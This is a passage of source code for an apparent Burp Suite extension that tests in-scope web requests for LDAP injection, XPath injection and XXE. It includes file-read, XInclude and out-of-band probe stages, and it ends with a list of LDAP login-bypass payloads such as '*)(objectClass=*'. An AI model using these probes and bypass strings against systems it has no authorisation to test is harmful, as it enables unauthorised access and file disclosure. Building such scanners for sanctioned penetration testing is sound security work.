        self.cb_xpath = self._checkbox("XPath Injection", self._cfg.enable_xpath)
        self.cb_xxe = self._checkbox("XXE Injection", self._cfg.enable_xxe)
        self.cb_xxe_fileread = self._checkbox("XXE file read", self._cfg.xxe_file_read)
        self.cb_xxe_xinclude = self._checkbox("XXE XInclude", self._cfg.xxe_xinclude)
        self.cb_xxe_oob = self._checkbox("XXE OOB (needs host)", self._cfg.xxe_oob)
        self.cb_error = self._checkbox("Error-based", self._cfg.check_error)
        self.cb_boolean = self._checkbox("Boolean-based", self._cfg.check_boolean)
        self.cb_wildcard = self._checkbox("Wildcard oracle", self._cfg.check_wildcard)
        self.cb_dn = self._checkbox("DN-context", self._cfg.dn_context)
        self.cb_pwd = self._checkbox("Test password field", self._cfg.test_password_field)
        self.cb_confirm = self._checkbox("Require Confirmation", self._cfg.require_confirmation)
        self.cb_retest = self._checkbox("Re-test Duplicates", self._cfg.retest_duplicates)
        self.cb_hidew = self._checkbox("Hide wildcard-only", self._cfg.hide_wildcard_only)
        for cb in (self.cb_enabled, self.cb_get, self.cb_post, self.cb_json,
                   self.cb_multipart, self.cb_xml, self.cb_logging,
                   self.cb_highlight, self.cb_swap, self.cb_path,
                   self.cb_ldap, self.cb_xpath, self.cb_xxe,
                   self.cb_xxe_fileread, self.cb_xxe_xinclude, self.cb_xxe_oob,
                   self.cb_error, self.cb_boolean,
                   self.cb_wildcard, self.cb_dn, self.cb_pwd, self.cb_confirm,
                   self.cb_retest, self.cb_hidew):
            checks.add(cb)

        fields = JPanel(GridLayout(0, 2, 6, 4))
        fields.add(JLabel("Custom always-true clause (optional):"))
        self.tf_true = JTextField(self._cfg.custom_true_clause)
        fields.add(self.tf_true)
        fields.add(JLabel("XXE custom file path (file:// or absolute):"))
        self.tf_xxe_file = JTextField(self._cfg.xxe_custom_file)
        fields.add(self.tf_xxe_file)
        fields.add(JLabel("XXE OOB host (only if OOB on):"))
        self.tf_xxe_oob = JTextField(self._cfg.xxe_oob_host)
        fields.add(self.tf_xxe_oob)
        fields.add(JLabel("Max requests / param:"))
        self.tf_maxreq = JTextField(str(self._cfg.max_req_per_param))
        fields.add(self.tf_maxreq)
        fields.add(JLabel("Auth-bypass max attempts:"))
        self.tf_abmax = JTextField(str(self._cfg.ab_max_attempts))
        fields.add(self.tf_abmax)
        fields.add(JLabel("Maximum Threads (applied on reload):"))
        self.tf_threads = JTextField(str(self._cfg.max_threads))
        fields.add(self.tf_threads)
        fields.add(JLabel("Rate limit ms:"))
        self.tf_rate = JTextField(str(self._cfg.rate_limit_ms))
        fields.add(self.tf_rate)
        fields.add(JLabel("Ignore Extensions (comma separated):"))
        self.tf_ignore = JTextField(",".join(self._cfg.ignore_extensions))
        fields.add(self.tf_ignore)

        buttons = JPanel(FlowLayout(FlowLayout.LEFT))
        buttons.add(JButton("Apply Settings", actionPerformed=self._apply))
        buttons.add(JButton("Proxy Scan", actionPerformed=self._proxy_scan))
        buttons.add(JButton("Sitemap Scan", actionPerformed=self._sitemap_scan))
        buttons.add(JButton("Rescan", actionPerformed=self._rescan))
        buttons.add(JButton("Clear Results", actionPerformed=self._clear))
        buttons.add(JButton("Export CSV", actionPerformed=self._export_csv))

        inner = JPanel(BorderLayout())
        inner.add(checks, BorderLayout.NORTH)
        inner.add(fields, BorderLayout.CENTER)
        inner.add(buttons, BorderLayout.SOUTH)
        panel.add(inner, BorderLayout.CENTER)
        return panel

    def _checkbox(self, label, state):
        cb = JCheckBox(label, state)
        cb.addActionListener(self._LiveToggle(self))
        return cb

    def _apply(self, event=None):
        self._sync_config()
        tmpls = build_templates(self._cfg)
        self._logger.info("Settings applied. Active templates: %d" % len(tmpls))

    def _rescan(self, event=None):
        if self._scanner is not None:
            self._scanner.reset_dedup()
        else:
            self._logger.info("Rescan: scanner not ready yet.")

    def _proxy_scan(self, event=None):
        self._sync_config()
        if self._scanner is not None:
            self._logger.info("Proxy history scan started...")
            self._scanner.scan_proxy_history()

    def _sitemap_scan(self, event=None):
        self._sync_config()
        if self._scanner is not None:
            self._logger.info("Site map scan started...")
            self._scanner.scan_sitemap()

    def _sync_config(self):
        c = self._cfg
        c.enabled = self.cb_enabled.isSelected()
        c.enable_get = self.cb_get.isSelected()
        c.enable_post = self.cb_post.isSelected()
        c.enable_json = self.cb_json.isSelected()
        c.enable_multipart = self.cb_multipart.isSelected()
        c.enable_xml = self.cb_xml.isSelected()
        c.enable_logging = self.cb_logging.isSelected()
        c.highlight = self.cb_highlight.isSelected()
        c.enable_method_swap = self.cb_swap.isSelected()
        c.enable_path_injection = self.cb_path.isSelected()
        c.enable_ldap = self.cb_ldap.isSelected()
        c.enable_xpath = self.cb_xpath.isSelected()
        c.enable_xxe = self.cb_xxe.isSelected()
        c.xxe_file_read = self.cb_xxe_fileread.isSelected()
        c.xxe_xinclude = self.cb_xxe_xinclude.isSelected()
        c.xxe_oob = self.cb_xxe_oob.isSelected()
        c.xxe_custom_file = self.tf_xxe_file.getText()
        c.xxe_oob_host = self.tf_xxe_oob.getText()
        c.check_error = self.cb_error.isSelected()
        c.check_boolean = self.cb_boolean.isSelected()
        c.check_wildcard = self.cb_wildcard.isSelected()
        c.dn_context = self.cb_dn.isSelected()
        c.test_password_field = self.cb_pwd.isSelected()
        c.require_confirmation = self.cb_confirm.isSelected()
        c.retest_duplicates = self.cb_retest.isSelected()
        c.hide_wildcard_only = self.cb_hidew.isSelected()
        c.custom_true_clause = self.tf_true.getText()
        for attr, field in (("max_req_per_param", self.tf_maxreq),
                            ("ab_max_attempts", self.tf_abmax),
                            ("max_threads", self.tf_threads),
                            ("rate_limit_ms", self.tf_rate)):
            try:
                setattr(c, attr, max(1, int(field.getText().strip())))
            except Exception:
                pass
        raw = self.tf_ignore.getText()
        exts = [e.strip().lower() for e in raw.split(",") if e.strip()]
        if exts:
            c.ignore_extensions = exts

    class _LiveToggle(ActionListener):
        def __init__(self, ui):
            self.ui = ui

        def actionPerformed(self, event):
            self.ui._sync_config()

    def _clear(self, event=None):
        self.model.clear()
        self._count_monitored = 0
        self._count_found = 0
        self._refresh_stats()

    def _export_csv(self, event=None):
        chooser = JFileChooser()
        chooser.setSelectedFile(File("ldap_findings.csv"))
        if chooser.showSaveDialog(self._root) != JFileChooser.APPROVE_OPTION:
            return
        path = chooser.getSelectedFile().getAbsolutePath()
        try:
            f = open(path, "w")
            try:
                f.write(",".join(ResultsTableModel.COLUMNS) + "\n")
                for r in self.model.all_rows():
                    cells = [r.time, r.method, r.url, r.where, r.vclass,
                             r.context, r.confidence, r.technique, r.backend,
                             r.evidence, str(r.status), str(r.length)]
                    esc = ['"%s"' % c.replace('"', '""') for c in cells]
                    f.write(",".join(esc) + "\n")
            finally:
                f.close()
            self._logger.info("Exported %d rows to %s"
                              % (self.model.getRowCount(), path))
        except Exception:
            self._logger.error("export_csv", sys.exc_info())

    def _send_to_repeater(self, rows):
        for r in rows:
            if r.request is None:
                continue
            self._repeater_counter += 1
            self._callbacks.sendToRepeater(r.host, r.port, r.https, r.request,
                                           "LDAP-%d" % self._repeater_counter)

    def _send_to_intruder(self, rows):
        for r in rows:
            if r.request is not None:
                self._callbacks.sendToIntruder(r.host, r.port, r.https, r.request)

    def _copy_url(self, rows):
        Utilities(None).copy_to_clipboard("\n".join([r.url for r in rows]))

    def _copy_request(self, rows):
        txt = "\n\n".join(
            [self._callbacks.getHelpers().bytesToString(r.request)
             for r in rows if r.request is not None])
        Utilities(None).copy_to_clipboard(txt)

    class _TableMouse(MouseAdapter):
        def __init__(self, ui, table, model):
            self.ui = ui
            self.table = table
            self.model = model

        def _rows(self):
            out = []
            for view_idx in self.table.getSelectedRows():
                out.append(self.model.get_row(
                    self.table.convertRowIndexToModel(view_idx)))
            return out

        def mousePressed(self, event):
            self._maybe_popup(event)

        def mouseReleased(self, event):
            self._maybe_popup(event)

        def mouseClicked(self, event):
            if event.getClickCount() == 2:
                rows = self._rows()
                if rows:
                    self.ui._send_to_repeater(rows)

        def _maybe_popup(self, event):
            if not event.isPopupTrigger():
                return
            row = self.table.rowAtPoint(event.getPoint())
            if row >= 0 and not self.table.isRowSelected(row):
                self.table.setRowSelectionInterval(row, row)
            self._popup().show(event.getComponent(), event.getX(), event.getY())

        def _popup(self):
            ui, mouse = self.ui, self
            menu = JPopupMenu()

            def item(label, handler):
                mi = JMenuItem(label)
                mi.addActionListener(mouse._Handler(mouse, handler))
                return mi
            menu.add(item("Send to Repeater", lambda rows: ui._send_to_repeater(rows)))
            menu.add(item("Send to Intruder", lambda rows: ui._send_to_intruder(rows)))
            menu.add(item("Copy URL", lambda rows: ui._copy_url(rows)))
            menu.add(item("Copy Request", lambda rows: ui._copy_request(rows)))
            menu.addSeparator()
            menu.add(item("Clear Results", lambda rows: ui._clear()))
            menu.add(item("Export CSV", lambda rows: ui._export_csv()))
            return menu

        class _Handler(ActionListener):
            def __init__(self, mouse, fn):
                self.mouse = mouse
                self.fn = fn

            def actionPerformed(self, event):
                self.fn(self.mouse._rows())

    # ---- thread-safe updates ------------------------------------------
    def inc_monitored(self):
        def _do():
            self._count_monitored += 1
            self._refresh_stats()
        SwingUtilities.invokeLater(_do)

    def add_finding(self, row):
        def _do():
            self.model.add_row(row)
            self._count_found += 1
            self._refresh_stats()
        SwingUtilities.invokeLater(_do)

    def set_detail(self, text):
        def _do():
            self.log_area.append(text + "\n")
            self.log_area.setCaretPosition(self.log_area.getDocument().getLength())
        SwingUtilities.invokeLater(_do)

    def append_log(self, text):
        def _do():
            self.log_area.append(text + "\n")
            self.log_area.setCaretPosition(self.log_area.getDocument().getLength())
        SwingUtilities.invokeLater(_do)


# ===========================================================================
#  Scanner
# ===========================================================================
class Scanner(object):

    def __init__(self, callbacks, helpers, config, utils, parser, builder,
                 detector, logger, ui):
        self._callbacks = callbacks
        self._helpers = helpers
        self._cfg = config
        self._utils = utils
        self._parser = parser
        self._builder = builder
        self._detector = detector
        self._logger = logger
        self._ui = ui

        # XXE is handled inline (same table, Type="XXE"), like XPath.
        self._xtargeter = XmlTargeter(utils)
        self._xbuilder = XxeRequestBuilder(helpers, utils, config)
        self._xdetector = XxeDetector(helpers, config)

        self._queue = Queue.Queue()
        self._workers = []
        self._running = True

        self._tested = set()
        self._tested_lock = threading.Lock()

        self._rl_lock = threading.Lock()
        self._last_request = 0.0

        self._cnt_lock = threading.Lock()
        self._jobs_queued = 0
        self._jobs_done = 0

    # ---- lifecycle ----------------------------------------------------
    def start(self):
        for i in range(self._cfg.max_threads):
            t = threading.Thread(target=self._worker_loop,
                                 name="ldap-worker-%d" % i)
            t.setDaemon(True)
            t.start()
            self._workers.append(t)
        self._logger.info("Started %d worker thread(s)." % len(self._workers))

    def stop(self):
        self._running = False
        for _ in self._workers:
            self._queue.put(None)

    def _enqueue(self, job):
        with self._cnt_lock:
            self._jobs_queued += 1
        self._queue.put(job)

    def _already_tested(self, key):
        with self._tested_lock:
            if key in self._tested:
                return True
            self._tested.add(key)
            return False

    def _dedup_skip(self, key):
        if self._cfg.retest_duplicates:
            return False
        return self._already_tested(key)

    def reset_dedup(self):
        with self._tested_lock:
            self._tested = set()
        self._logger.info("Rescan: dedup cleared. Reload page(s) to re-test.")

    # ---- bulk scans ---------------------------------------------------
    def scan_proxy_history(self):
        def run():
            try:
                items = self._callbacks.getProxyHistory()
            except Exception:
                self._logger.error("getProxyHistory", sys.exc_info())
                return
            self._bulk_scan(items, "Proxy history")
        t = threading.Thread(target=run, name="ldap-bulk-proxy")
        t.setDaemon(True)
        t.start()

    def scan_sitemap(self):
        def run():
            try:
                items = self._callbacks.getSiteMap(None)
            except Exception:
                self._logger.error("getSiteMap", sys.exc_info())
                return
            self._bulk_scan(items, "Site map")
        t = threading.Thread(target=run, name="ldap-bulk-sitemap")
        t.setDaemon(True)
        t.start()

    def _bulk_scan(self, items, label):
        if not items:
            self._logger.info("%s scan: nothing to scan." % label)
            return
        fed = 0
        for it in items:
            try:
                if it.getRequest() is None:
                    continue
                self.schedule(it)
                fed += 1
            except Exception:
                self._logger.error("bulk scan (%s)" % label, sys.exc_info())
        self._logger.info("%s scan: fed %d item(s); scanning in background..."
                          % (label, fed))

    def scan_messages(self, messages):
        if not messages:
            return
        snapshot = list(messages)

        def run():
            fed = 0
            for mi in snapshot:
                try:
                    if mi.getRequest() is None:
                        continue
                    self.schedule(mi, force=True)
                    fed += 1
                except Exception:
                    self._logger.error("send-to-ldap", sys.exc_info())
            self._logger.info("Send to LDAP: queued %d request(s) (forced)." % fed)
        t = threading.Thread(target=run, name="ldap-sendto")
        t.setDaemon(True)
        t.start()

    # ---- entry from HTTP listener -------------------------------------
    def schedule(self, message_info, force=False):
        request = message_info.getRequest()
        response = message_info.getResponse()
        if request is None:
            return
        req_info = self._helpers.analyzeRequest(message_info)
        method = req_info.getMethod()
        url = req_info.getUrl()
        if method not in ("GET", "POST"):
            return
        if not force:
            if not self._callbacks.isInScope(url):
                return
            if self._utils.has_ignored_extension(url, self._cfg.ignore_extensions):
                return
            if method == "GET" and not self._cfg.enable_get:
                return
            if method == "POST" and not self._cfg.enable_post:
                return
            if response is not None and not self._is_testable_response(response):
                return

        baseline_body = self._detector.body_str(response) if response else ""
        self._ui.inc_monitored()

        service = message_info.getHttpService()
        path = url.getPath()

        common = {"request": request, "method": method, "service": service,
                  "message_info": message_info, "url": url.toString(),
                  "baseline": baseline_body, "path": path}

        # --- XXE: fires only on XML request bodies, reports Type="XXE" ----
        if self._cfg.enable_xxe:
            self._schedule_xxe(message_info, req_info, method, path, common)

        if not self._cfg.enable_ldap and not self._cfg.enable_xpath:
            return
        descs = self._parser.parse(request, req_info, method)

        # one scan job per parameter (each runs its own staged pipeline so the
        # per-param request budget is enforced inside the worker).
        user_descs = [d for d in descs if not self._is_password_name(d["name"])]
        pwd_descs = [d for d in descs if self._is_password_name(d["name"])]

        # priority: hinted param names first
        user_descs.sort(key=lambda d: 0 if self._is_hinted(d["name"]) else 1)

        for desc in user_descs:
            placements = [("param", "native")]
            if desc["kind"] in ("url", "body") and self._cfg.enable_method_swap:
                placements.append(("param", "swap"))
            for placement, variant in placements:
                dkey = "%s|%s|%s|%s%s" % (method, path, placement,
                                          desc["name"], variant)
                if self._dedup_skip(dkey):
                    continue
                job = dict(common)
                job.update({"placement": placement, "variant": variant,
                            "desc": desc, "is_pwd": False,
                            "pwd_descs": pwd_descs})
                self._enqueue(job)

        if self._cfg.enable_path_injection:
            dkey = "%s|%s|path" % (method, path)
            if not self._dedup_skip(dkey):
                job = dict(common)
                job.update({"placement": "path", "variant": None,
                            "desc": None, "is_pwd": False, "pwd_descs": []})
                self._enqueue(job)

    def _is_password_name(self, name):
        return "pass" in (name or "").lower()

    _HINTS = ("uid", "cn", "sn", "dn", "ou", "mail", "email", "user",
              "username", "login", "samaccountname", "memberof", "account",
              "search", "q")

    def _is_hinted(self, name):
        n = (name or "").lower()
        return any(h in n for h in self._HINTS)

    def _is_testable_response(self, response):
        info = self._helpers.analyzeResponse(response)
        mime = info.getStatedMimeType() or info.getInferredMimeType() or ""
        return mime in self._cfg.testable_mimes

    # ---- worker -------------------------------------------------------
    def _worker_loop(self):
        while self._running:
            job = self._queue.get()
            try:
                if job is None:
                    break
                if job.get("placement") == "xxe":
                    self._scan_xxe_leaf(job)
                else:
                    self._scan_job(job)
            except Exception:
                self._logger.error("worker", sys.exc_info())
            finally:
                with self._cnt_lock:
                    self._jobs_done += 1
                self._queue.task_done()

    def _rate_limit(self):
        gap = self._cfg.rate_limit_ms / 1000.0
        with self._rl_lock:
            wait = self._last_request + gap - time.time()
            if wait > 0:
                time.sleep(wait)
            self._last_request = time.time()

    def _build_request(self, job, value):
        placement = job["placement"]
        if placement == "path":
            return self._builder.build_path(job["request"], value), job["method"]
        if job["variant"] == "swap":
            return self._builder.build_method_swap(job["request"], job["desc"], value)
        return self._builder.build(job["request"], job["desc"], value), job["method"]

    def _send(self, job, value, raw=False):
        """Build + send one probe. raw=True injects the value with our own
        encoder (keeps structural LDAP chars intact)."""
        injected, method_used = self._build_request(job, value)
        if injected is None:
            return None, None, None
        self._rate_limit()
        try:
            rr = self._callbacks.makeHttpRequest(job["service"], injected)
        except Exception:
            self._logger.error("makeHttpRequest", sys.exc_info())
            return None, None, None
        resp = rr.getResponse() if rr is not None else None
        return resp, injected, method_used

    # ---- staged scan for one parameter --------------------------------
    def _scan_job(self, job):
        budget = [self._cfg.max_req_per_param]
        desc = job["desc"]
        where_base = "PATH" if desc is None else desc["name"]
        value = self._value_of(job) if desc is not None else ""

        templates = build_templates(self._cfg)

        # Stage 0: baseline stability (2 req)
        if budget[0] < 2:
            return
        r1, _i1, _m1 = self._send(job, value, raw=True)
        budget[0] -= 1
        r2, _i2, _m2 = self._send(job, value, raw=True)
        budget[0] -= 1
        if r1 is None or r2 is None:
            return
        base = self._detector.model(r1)
        base_stable = responses_similar(base, self._detector.model(r2))

        hit = None

        # Stage 1: error-based (LDAP + XPath)
        for tmpl in templates:
            if tmpl["tech"] != "error" or budget[0] <= 0:
                continue
            payload = tmpl["payload"].replace("{V}", value)
            resp, injected, method_used = self._send(job, payload, raw=True)
            budget[0] -= 1
            if resp is None:
                continue
            body = self._detector.body_str(resp)
            ev, backend = self._detector.new_error(
                body, job["baseline"], tmpl["vclass"], tmpl.get("dn", False))
            self._logger.log_test(self._utils.now(), method_used, job["url"],
                                  where_base, tmpl["label"],
                                  self._detector.status_length(resp)[0],
                                  ev is not None)
            if ev:
                ctx = "DN" if tmpl.get("dn") else "filter"
                st, ln = self._detector.status_length(resp)
                hit = {"vclass": tmpl["vclass"], "context": ctx,
                       "confidence": "Firm", "technique": "error",
                       "backend": backend or "unknown",
                       "evidence": "new error: " + ev[:100],
                       "status": st, "length": ln,
                       "request": injected, "response": resp,
                       "method": method_used}
                break

        # Stage 2-4: boolean (only if no error hit, or to upgrade to Certain)
        bool_hit = self._boolean_stages(job, value, base, base_stable,
                                        templates, budget, where_base)
        if bool_hit:
            hit = bool_hit  # boolean (confirmed) outranks a bare error

        # password-field confirm probe
        if (hit and self._cfg.test_password_field and job.get("pwd_descs")
                and not job["is_pwd"]):
            self._probe_password(job, templates)

        if hit:
            self._report(job, where_base, hit)

    def _boolean_stages(self, job, value, base, base_stable, templates,
                        budget, where_base):
        bt = [t for t in templates if t["tech"] == "boolean"]
        for tmpl in bt:
            if budget[0] < 2:
                break
            tp, fp, tpw, fpw = materialize_boolean(tmpl, value, self._cfg)
            if base_stable and not base.has_failure:
                true_p, false_p = tp, fp
            else:
                true_p, false_p = tpw, fpw
            rtrue, itrue, mu = self._send(job, true_p, raw=True)
            budget[0] -= 1
            rfalse, _if, _mf = self._send(job, false_p, raw=True)
            budget[0] -= 1
            if rtrue is None or rfalse is None:
                continue
            mt = self._detector.model(rtrue)
            mf = self._detector.model(rfalse)
            differ, detail = responses_differ(mt, mf)
            self._logger.log_test(self._utils.now(), mu, job["url"],
                                  where_base, tmpl["label"],
                                  mt.status, differ)
            if not differ:
                continue

            # wildcard support (optional)
            wild_ok = False
            if self._cfg.check_wildcard and budget[0] >= 2:
                wt, wf = materialize_wildcard(value)
                rwt, _a, _b = self._send(job, wt, raw=True)
                budget[0] -= 1
                rwf, _c, _d = self._send(job, wf, raw=True)
                budget[0] -= 1
                if rwt is not None and rwf is not None:
                    wild_ok = responses_differ(self._detector.model(rwt),
                                               self._detector.model(rwf))[0]

            # confirmation (fresh pair)
            confirmed = not self._cfg.require_confirmation
            if self._cfg.require_confirmation and budget[0] >= 2:
                tp2, fp2, tpw2, fpw2 = materialize_boolean(tmpl, value, self._cfg)
                if base_stable and not base.has_failure:
                    c_true, c_false = tp2, fp2
                else:
                    c_true, c_false = tpw2, fpw2
                rct, _e, _f = self._send(job, c_true, raw=True)
                budget[0] -= 1
                rcf, _g, _h = self._send(job, c_false, raw=True)
                budget[0] -= 1
                if rct is not None and rcf is not None:
                    confirmed = responses_differ(self._detector.model(rct),
                                                 self._detector.model(rcf))[0]

            if not confirmed:
                self._logger.info("Boolean confirmation FAILED -> dropped: %s"
                                  % where_base)
                continue

            conf = "Certain" if confirmed else "Firm"
            tech = "boolean" + ("+wildcard" if wild_ok else "")
            backend = refine_backend(mt.body, "unknown") if tmpl["vclass"] == "LDAP" else "-"
            return {"vclass": tmpl["vclass"],
                    "context": "pred" if tmpl["vclass"] == "XPath" else "filter",
                    "confidence": conf, "technique": tech,
                    "backend": backend,
                    "evidence": "TRUE/FALSE differ: " + ", ".join(detail),
                    "status": mt.status, "length": mt.length,
                    "request": itrue, "response": rtrue, "method": mu}
        return None

    def _probe_password(self, job, templates):
        """Light confirm-probe on the password field(s): one boolean pair."""
        for pdesc in job["pwd_descs"]:
            pjob = dict(job)
            pjob.update({"desc": pdesc, "variant": "native",
                         "placement": "param", "is_pwd": True, "pwd_descs": []})
            budget = [max(4, self._cfg.max_req_per_param // 2)]
            pval = self._value_of(pjob)
            r1, _a, _b = self._send(pjob, pval, raw=True)
            budget[0] -= 1
            if r1 is None:
                continue
            base = self._detector.model(r1)
            bt = [t for t in templates if t["tech"] == "boolean"
                  and t["vclass"] == "LDAP"]
            if not bt or budget[0] < 2:
                continue
            tp, fp, _tw, _fw = materialize_boolean(bt[0], pval, self._cfg)
            rt, it, mu = self._send(pjob, tp, raw=True)
            budget[0] -= 1
            rf, _c, _d = self._send(pjob, fp, raw=True)
            budget[0] -= 1
            if rt is None or rf is None:
                continue
            if responses_differ(self._detector.model(rt),
                                self._detector.model(rf))[0]:
                hit = {"vclass": "LDAP", "context": "filter (password field)",
                       "confidence": "Firm", "technique": "boolean",
                       "backend": "unknown",
                       "evidence": "password-field TRUE/FALSE differ",
                       "status": self._detector.model(rt).status,
                       "length": self._detector.model(rt).length,
                       "request": it, "response": rt, "method": mu}
                self._report(pjob, pdesc["name"], hit)

    def _value_of(self, job):
        desc = job["desc"]
        if desc is None:
            return ""
        req_info = self._helpers.analyzeRequest(job["request"])
        for p in req_info.getParameters():
            if p.getName() == desc["name"]:
                try:
                    return p.getValue() or ""
                except Exception:
                    return ""
        return ""

    def _report(self, job, where, hit):
        srv = job["service"]
        color = confidence_color(hit["confidence"])
        row = ResultRow(self._utils.now(), hit["method"], job["url"], where,
                        hit["vclass"], hit["context"], hit["confidence"],
                        hit["technique"], hit["backend"], hit["evidence"],
                        hit["status"], hit["length"], hit["request"],
                        hit["response"], srv.getHost(), srv.getPort(),
                        srv.getProtocol() == "https", color)
        self._ui.add_finding(row)
        self._logger.finding(self._utils.now(), hit["method"], job["url"],
                             where, hit["vclass"], hit["confidence"],
                             hit["evidence"])
        if self._cfg.highlight:
            try:
                mi = job["message_info"]
                mi.setHighlight(confidence_hl(hit["confidence"]))
                mi.setComment("%s Injection (%s) | Where: %s | %s"
                              % (hit["vclass"], hit["confidence"], where,
                                 hit["evidence"]))
            except Exception:
                pass

    # ===================================================================
    #  XXE (integrated; reports into the same table with vclass="XXE")
    # ===================================================================
    def _schedule_xxe(self, message_info, req_info, method, path, common):
        request = message_info.getRequest()
        body = self._utils.get_body_str(request, req_info)
        ctype = self._utils.header_value(req_info, "content-type")
        if not self._xtargeter.is_xml(ctype, body):
            return
        leaves = self._xtargeter.leaves(body, self._cfg.xxe_max_leaves)
        root_name = self._xxe_root(body)
        xcommon = dict(common)
        xcommon.update({"body": body, "root_name": root_name})
        if leaves:
            for leaf in leaves:
                dkey = "%s|%s|xxe|%s|%d" % (method, path, leaf["name"],
                                            leaf["occ"])
                if self._dedup_skip(dkey):
                    continue
                job = dict(xcommon)
                job.update({"placement": "xxe", "leaf": leaf})
                self._enqueue(job)
        else:
            dkey = "%s|%s|xxe|__xinclude__" % (method, path)
            if not self._dedup_skip(dkey):
                job = dict(xcommon)
                job.update({"placement": "xxe", "leaf": None})
                self._enqueue(job)

    def _xxe_root(self, body):
        m = re.search(r'<\s*([A-Za-z_][\w\.\-:]*)', body)
        return m.group(1) if m else "root"

    def _xsend(self, job, injected):
        if injected is None:
            return None
        self._rate_limit()
        try:
            rr = self._callbacks.makeHttpRequest(job["service"], injected)
        except Exception:
            self._logger.error("xxe makeHttpRequest", sys.exc_info())
            return None
        return rr

    def _scan_xxe_leaf(self, job):
        leaf = job["leaf"]
        body = job["body"]
        base = job["baseline"]
        element = leaf["name"] if leaf else "(root/xinclude)"
        reflected_here = False
        xd = self._xdetector

        # Stage 0: reflection / DTD-processing probe
        if self._cfg.xxe_reflection and leaf is not None:
            doctype, leaf_text, needle = xxe_reflect_probe(self._cfg)
            injected = self._xbuilder.build(job["request"], body, leaf["occ"],
                                            doctype, leaf_text)
            rr = self._xsend(job, injected)
            if rr is not None:
                reflected_here = xd.reflected(rr.getResponse(), needle, base)

        # Stage 2: classic file read into a reflected leaf
        if self._cfg.xxe_file_read and leaf is not None and reflected_here:
            if self._xxe_file_read(job, leaf, body, base, element):
                return

        # Stage 1 + 3: error-based parser confirmation + error-exfil
        if self._cfg.xxe_error_based and leaf is not None:
            doctype, leaf_text = xxe_error_probe()
            injected = self._xbuilder.build(job["request"], body, leaf["occ"],
                                            doctype, leaf_text)
            rr = self._xsend(job, injected)
            if rr is not None:
                resp = rr.getResponse()
                err = xd.new_parser_error(resp, base)
                if err:
                    st, ln = xd.status_length(resp)
                    self._report_xxe(job, element, "error", "-", "Firm",
                                     "new XML error: " + err[:80], st, ln,
                                     injected, resp, COLOR_ORANGE)
            for uri, oracle, label in xxe_file_targets(self._cfg):
                doctype = xxe_error_exfil(uri)
                injected = self._xbuilder.build(job["request"], body,
                                                leaf["occ"], doctype,
                                                "&x%s;" % rand_tail(3))
                rr = self._xsend(job, injected)
                if rr is None:
                    continue
                resp = rr.getResponse()
                rbody = xd.body_str(resp)
                if oracle is not None and oracle.search(rbody) \
                        and not oracle.search(base):
                    ev = oracle.search(rbody).group(0)[:140]
                    st, ln = xd.status_length(resp)
                    self._report_xxe(job, element, "error-exfil", label,
                                     "Certain", ev, st, ln, injected, resp,
                                     COLOR_RED)
                    return

        # Stage 4: XInclude (DOCTYPE-less)
        if self._cfg.xxe_xinclude:
            if self._xxe_xinclude(job, element, base):
                return

        # OOB (off unless toggled + host set)
        if self._cfg.xxe_oob and leaf is not None:
            self._xxe_oob(job, leaf, body, element)

    def _xxe_file_read(self, job, leaf, body, base, element):
        xd = self._xdetector
        token = self._cfg.canary + rand_tail(3)
        for uri, oracle, label in xxe_file_targets(self._cfg):
            doctype, leaf_text = xxe_file_read(uri, token)
            injected = self._xbuilder.build(job["request"], body, leaf["occ"],
                                            doctype, leaf_text)
            rr = self._xsend(job, injected)
            if rr is None:
                continue
            resp = rr.getResponse()
            ev = xd.file_evidence(resp, oracle, token, leaf_text, base)
            if ev:
                if self._cfg.require_confirmation and \
                        not self._xxe_confirm(job, leaf, body, uri, oracle):
                    continue
                st, ln = xd.status_length(resp)
                self._report_xxe(job, element, "file-read", label, "Certain",
                                 ev, st, ln, injected, resp, COLOR_RED)
                return True
        return False

    def _xxe_confirm(self, job, leaf, body, uri, oracle):
        if not self._cfg.require_confirmation:
            return True
        token = self._cfg.canary + rand_tail(3)
        doctype, leaf_text = xxe_file_read(uri, token)
        occ = leaf["occ"] if leaf else 0
        injected = self._xbuilder.build(job["request"], body, occ, doctype,
                                        leaf_text)
        rr = self._xsend(job, injected)
        if rr is None:
            return False
        return self._xdetector.file_evidence(rr.getResponse(), oracle, token,
                                             leaf_text, job["baseline"]) is not None

    def _xxe_xinclude(self, job, element, base):
        xd = self._xdetector
        token = self._cfg.canary + rand_tail(3)
        for uri, oracle, label in xxe_file_targets(self._cfg):
            new_body = xxe_xinclude_body(job["root_name"], uri, token)
            injected = self._xbuilder.build_raw_body(job["request"], new_body)
            rr = self._xsend(job, injected)
            if rr is None:
                continue
            resp = rr.getResponse()
            ev = xd.file_evidence(resp, oracle, token, new_body, base)
            if ev:
                st, ln = xd.status_length(resp)
                self._report_xxe(job, element, "xinclude", label, "Certain",
                                 ev, st, ln, injected, resp, COLOR_RED)
                return True
        return False

    def _xxe_oob(self, job, leaf, body, element):
        token = self._cfg.canary + rand_tail(3)
        doctype, leaf_text = xxe_oob_probe(self._cfg, token)
        if doctype is None:
            self._logger.info("XXE OOB enabled but no host set; skipping.")
            return
        injected = self._xbuilder.build(job["request"], body, leaf["occ"],
                                        doctype, leaf_text)
        self._xsend(job, injected)
        self._logger.info("XXE OOB probe sent for %s (token %s)."
                          % (element, token))

    def _report_xxe(self, job, element, technique, oracle, conf, evidence,
                    status, length, req, resp, color):
        srv = job["service"]
        # map into the shared ResultRow columns:
        #   Type=XXE, Where=element, Context=technique, Technique=technique,
        #   Backend=oracle
        row = ResultRow(self._utils.now(), job["method"], job["url"], element,
                        "XXE", technique, conf, technique, oracle, evidence,
                        status, length, req, resp, srv.getHost(),
                        srv.getPort(), srv.getProtocol() == "https", color)
        self._ui.add_finding(row)
        self._logger.finding(self._utils.now(), job["method"], job["url"],
                             element, "XXE", conf, evidence)
        if self._cfg.highlight:
            try:
                mi = job["message_info"]
                mi.setHighlight("red" if color == COLOR_RED else "orange")
                mi.setComment("XXE (%s/%s) | Elem: %s | %s"
                              % (technique, conf, element, evidence))
            except Exception:
                pass


# ===========================================================================
#  AuthBypass  (manual-only login-bypass helper, guard-railed)
# ===========================================================================
class AuthBypass(object):

    # (username_value, password_value, label). {U} -> "admin"
    PAYLOADS = [
        ("*",                    "*",        "user=*  pass=*"),
        ("*)(objectClass=*",     "*",        "user=*)(objectClass=*"),
        ("{U})(|(objectClass=*", "anything", "user=admin)(|(objectClass=*"),
        ("admin)(|(uid=*",       "anything", "user=admin)(|(uid=*"),
        ("admin))%00",           "anything", "user=admin))%00 (null-byte)"),
    ]

    def __init__(self, callbacks, helpers, config, builder, detector, logger, ui):
